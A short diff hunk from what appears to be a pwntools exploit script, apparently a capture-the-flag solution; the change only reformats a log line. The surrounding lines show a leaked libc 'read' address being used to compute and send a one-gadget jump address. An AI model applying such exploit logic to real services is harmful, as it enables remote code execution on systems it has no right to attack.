@@ -26,7 +26,7 @@ def exp(self, a: pwnlib.tubes.sock.sock):
     a.sl(payload)
 
     read_addr = unpack(a.recvn(4), 'all')
-    a.lg(f"{read_addr=:#x}")
+    a.lg(f"read_addr={read_addr:#x}")
     one_addr = read_addr + one_offset - read_offset
 
     a.send(p32(one_addr))
